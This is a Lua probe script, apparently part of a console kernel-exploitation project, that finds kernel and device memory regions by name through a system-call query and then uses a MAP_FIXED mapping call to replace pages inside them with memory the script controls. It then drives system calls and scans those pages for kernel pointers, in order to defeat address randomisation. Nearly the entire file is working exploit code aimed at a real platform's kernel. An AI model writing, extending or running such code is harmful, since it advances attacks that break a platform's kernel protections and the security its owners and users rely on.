-- CRASH_CLASS: MODERATE
-- PROBE 1509a: GRAFT our own anonymous page into a kernel-authored region
--
-- Context: 1508a proved 548 op 3 with flags bit 0x10 (MAP_FIXED) DELETES the
-- vm_map entry covering the range and installs a fresh anonymous one, with no
-- ownership or overlap check -- it replaced a live anon page, landed exactly on
-- a chosen hole, and replaced the SceGnmTrapCode device window (which then read
-- 00000000 where it had read 01 00 80 BF) with no panic.  So the kernel's own
-- view of a VA can be replaced by memory we own.
--
-- That turns the question around: if the kernel or a device still believes it
-- owns a region, and we swap the backing page for ours, does anything write
-- into our page afterwards?  A single 0xFFFF8xxx dword would be the project's
-- first kernel pointer obtained through a mapped region.
--
-- Targets are found by name with 674 (72-byte records: start@0x00, end@0x08,
-- prot@0x18, name@0x20) rather than hardcoded, because KASLR moved this boot.
-- One 16 KiB page is grafted per target, deep inside the region where possible,
-- so a single-page graft does not take out a region base the loader may need.
--
-- prior art: docs/DEVICE_WINDOW_14_10.md (548 op map, op3 = anonymous map)
--            results/phase36_realargs/1508a_sys548_map_fixed_20261109_224934.txt
--            results/phase36_realargs/1481c_gpu_region_content_20261109_201653.txt
--            results/phase36_realargs/1492a_sys548_map_ceiling_20261109_220558.txt

print("=== PROBE 1509a: GRAFT ANON PAGES OVER KERNEL REGIONS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local mk = {}
for _, n in ipairs({20,548,593,649,674}) do mk[n] = make_syscall(n) end

local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wr(a, v)
    return pcall(function() memory.write_dword(a, uint64(v)) end)
end
local function u32(v)
    local n = tonumber(v) or 0
    if n < 0 then n = n + 4294967296 end
    return n % 4294967296
end
local function sgn(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(a1, a2, a3, a4, a5, a6) end)
    if ok then return r end
    return "EXC"
end
local function spin(n) for i = 1, n do local x = i * 3 end end
print("[0] pid=" .. tonumber(to_num(mk[20]())))

-- ------------------------------------------------------------------
-- 674: build a name -> {start, end, prot} table
-- ------------------------------------------------------------------
local NMAX = 512
local nbuf = memory.alloc(NMAX * 72 + 64)
local ncnt = memory.alloc(8)
wr(ncnt, 0)
local rv674 = call(mk[674], uint64(nbuf), uint64(72), uint64(NMAX), uint64(ncnt), uint64(0x40000000), uint64(0))
local ncount = rd(ncnt)
if ncount < 0 or ncount > NMAX then ncount = 0 end
print("[674] rv=" .. tostring(rv674) .. " records=" .. ncount)

local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return u32(to_num(v)) end
    return 0
end
local function rdq(a)
    return rd(a) + rd(a + 4) * 4294967296
end
local function name_at(rec)
    local s = ""
    for i = 0, 63 do
        local b = rb(rec + 0x21 + i)
        if b == 0 then break end
        if b < 32 or b > 126 then break end
        s = s .. string.char(b)
    end
    return s
end

-- 674 names are printed verbatim: SceKernelInternalMemory has no leading
-- slash, /AOSharedState does (results/phase36_realargs/1481f_...txt lines 69,
-- 310, 312), so match both spellings.
local want = {["SceKernelInternalMemory"] = 0x800000, ["SceNpGlobalHeap"] = 0x40000,
              ["AOSharedState"] = 0, ["/AOSharedState"] = 0, ["SceGnmTrapData"] = 0}
local found = {}
local shown_names = 0
for i = 0, ncount - 1 do
    local rec = nbuf + i * 72
    local s = rdq(rec + 0x00)
    local e = rdq(rec + 0x08)
    local pr = rd(rec + 0x18)
    local nm = name_at(rec)
    if shown_names < 4 then
        print(string.format("  scan[%d] s=0x%X e=0x%X prot=0x%X nm=[%s]", i, s, e, pr, nm))
        shown_names = shown_names + 1
    end
    local key = nil
    if want[nm] ~= nil then key = nm end
    if not key and nm:find("^anon:") and s >= 0x200000000 and s < 0x211000000 then key = "gpupool" end
    if key then
        local lo = s
        print(string.format("  [%s] start=0x%X end=0x%X prot=0x%X len=0x%X",
            key, lo, e, pr, e - lo))
        found[key] = {start = lo, len = e - lo, prot = pr}
    end
end
if not found["SceKernelInternalMemory"] then
    print("  SceKernelInternalMemory not in 674 output -- check the name")
end

-- ------------------------------------------------------------------
-- graft helper
-- ------------------------------------------------------------------
local ent = memory.alloc(0x40)
local done = memory.alloc(8)
local function batch(startva, len, prot, op, flags)
    local i
    for i = 0, 0x3F, 8 do wr(ent + i, 0); wr(ent + i + 4, 0) end
    local lo = startva % 4294967296
    local hi = math.floor(startva / 4294967296)
    wr(ent + 0x00, lo); wr(ent + 0x04, hi)
    wr(ent + 0x10, len % 4294967296); wr(ent + 0x14, math.floor(len / 4294967296))
    wr(ent + 0x18, prot)
    wr(ent + 0x1C, op)
    wr(done, 0)
    local r = call(mk[548], uint64(0), uint64(flags), uint64(ent), uint64(1), uint64(done), uint64(0))
    return sgn(r), rd(done)
end

local grafted = {}
local function graft(name, off, why)
    local t = found[name]
    if not t then print(string.format("  [%s] absent, skipped", name)) return nil end
    local va = t.start + off
    if va % 0x4000 ~= 0 then
        va = va + (0x4000 - (va % 0x4000))
    end
    if off + 0x4000 > t.len then
        print(string.format("  [%s] region too small for +0x%X, skipped", name, off)) return nil
    end
    print(string.format("-- graft %s at 0x%X (+0x%X) --", name, va, off))
    local rv, proc = batch(va, 0x4000, 3, 3, 0x10)
    print(string.format("   op3 MAP_FIXED rv=0x%X processed=%d", rv, proc))
    if proc ~= 1 then print("   refused, skip") return nil end
    if rv ~= va then
        print(string.format("   landed at 0x%X, not 0x%X -- skip (the fill would hit the live region)", rv, va))
        return nil
    end
    local i
    for i = 0, 0x3FFC, 4 do wr(va + i, 0xCCCCCCCC) end
    local v0 = u32(rd(va))
    local v1 = u32(rd(va + 0x1000))
    if v0 ~= 0xCCCCCCCC then
        print(string.format("   sentinel readback 0x%X -- page not ours, skip", v0))
        return nil
    end
    print(string.format("   sentinel holds (0x%X, 0x%X) -- the page is ours now", v0, v1))
    grafted[#grafted + 1] = {name = name, va = va}
    return va
end

print("")
print("--- [A] graft one page per target ---")
-- riskiest last: a kill keeps everything printed above it
graft("SceGnmTrapData", 0, "device trap data (1508a replaced its sibling and lived)")
graft("/AOSharedState", 0, "OS shared state")
graft("gpupool", 0x400000, "GPU pool")
graft("SceNpGlobalHeap", 0x40000, "np global heap")
graft("SceKernelInternalMemory", 0x800000, "kernel internal memory, deep offset")

if #grafted == 0 then
    print("nothing grafted -- VERDICT VOID")
    return
end

-- ------------------------------------------------------------------
-- (B) drive work; anything kernel-side that still believes it owns the
--     region writes into our page
-- ------------------------------------------------------------------
print("")
print("--- [B] drive syscalls and wait; anything written into a grafted page is a leak ---")
local dbuf = memory.alloc(0x2000)
local info = memory.alloc(0x200)
local cnt = memory.alloc(8)
for round = 1, 3 do
    print("  round " .. round .. " pid=" .. tonumber(to_num(mk[20]())))
    wr(dbuf, 0x160)
    call(mk[593], uint64(0), uint64(dbuf))
    wr(cnt, 0)
    call(mk[674], uint64(nbuf), uint64(72), uint64(64), uint64(cnt), uint64(0x40000000), uint64(0))
    for h = 1, 8 do
        call(mk[649], uint64(h), uint64(1), uint64(info), uint64(0x200), uint64(0), uint64(0))
    end
    batch(0, 0, 0, 1, 0)
    spin(20000000)
end

-- ------------------------------------------------------------------
-- (C) rescan
-- ------------------------------------------------------------------
print("")
print("--- [C] rescan the grafted pages ---")
local total_hits = 0
for gi = 1, #grafted do
    local g = grafted[gi]
    local hits = 0
    local shown = 0
    local faults = 0
    local i = 0
    while i < 0x4000 do
        local raw = rd(g.va + i)
        if raw == nil then
            faults = faults + 1
        else
            local v = u32(raw)
            if v ~= 0xCCCCCCCC then
            hits = hits + 1
                if shown < 8 then
                    print(string.format("  [%s] +0x%04X = 0x%08X", g.name, i, v))
                    shown = shown + 1
                end
            end
        end
        i = i + 4
    end
    total_hits = total_hits + hits
    print(string.format("  [%s] changed dwords: %d, unreadable dwords: %d", g.name, hits, faults))
end
print("")
print(string.format("TOTAL changed dwords across %d grafted pages: %d", #grafted, total_hits))
if total_hits > 0 then
    print("VERDICT: something wrote into memory whose backing we replaced")
else
    print("VERDICT: no writer -- the regions are inert or their owner was released")
end
print("")
print("final canary pid=" .. tonumber(to_num(mk[20]())))
print("=== PROBE 1509a COMPLETE ===")
